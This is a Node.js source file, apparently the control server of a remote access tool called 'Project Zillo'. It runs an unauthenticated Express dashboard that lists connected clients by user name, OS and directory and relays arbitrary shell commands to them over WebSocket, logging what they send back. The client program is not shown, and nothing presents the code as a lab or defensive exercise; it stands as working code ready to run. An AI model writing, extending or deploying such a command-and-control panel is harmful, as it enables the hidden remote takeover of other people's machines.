// WebSocket
const WebSocket = require("ws");
let server = require("http").createServer();

// Express
const express = require("express")
const app = express()
const port = 6969
const bodyParser = require('body-parser');

app.set("views", __dirname + "/views");
app.set("view engine", "ejs");

app.use(bodyParser.urlencoded({extended: false}));
app.use(express.static("public"))

let clients = [];

app.get("/", (req, res) => {
    res.render("dashboard", {
        clients: clients,
    });
})

app.get("/:id", (req, res) => {
    let id = req.params.id;

    let client = clientFromId(id);
    if (client) {
        res.render("client", {
            client: client,
        })
    } else {
        res.render("error", {
            message: "client not found",
        })
    }
})

app.post("/:id/exec", (req, res) => {
    let id = req.params.id;
    let cmd = req.body.cmd;

    let client = clientFromId(id);
    if (client) {
        let instruction = JSON.stringify({
            type: "exec",
            value: cmd,
        })

        client.socket.send(instruction)

        res.redirect("/" + client.id);
    }
})

function clientFromId(id) {
    for (let i = 0; i < clients.length; i++) {
        let client = clients[i];
        if (client.id == id) {
            return client;
        }
    }

    return false;
}

const wss = new WebSocket.Server({
    server: server,
    perMessageDeflate: false
});

server.on("request", app);

wss.on("connection", function(ws, req) {
    console.log("Connected with " + ws._socket.remoteAddress);

    ws.on("message", function(message) {
        let json = JSON.parse(message)

        if (json) {
            let type = json.type;
            if (type == "connection") {
                console.log(json);

                let name = json.user;
                let os = json.os;
                let path = json.dir;

                clients.push({
                    id: clients.length+1,
                    name: name,
                    os: os,
                    path: path,
                    socket: ws,
                });
            } else if (type == "result") {
                console.log(json);
            } else {
                console.log("Couldnt format JSON");
                console.log(json);
            }
        } else {
            console.log("Not succesful JSON");
            console.log(message);
        }
    })

    ws.on("close", function() {
        for (let i = 0; i < clients.length; i++) {
            var client = clients[i];
            if (client.socket == ws) {
                clients.splice(i, 1);
            }
        }
    })
});

server.listen(port, function() {
    console.log("Project Zillo initiated");
});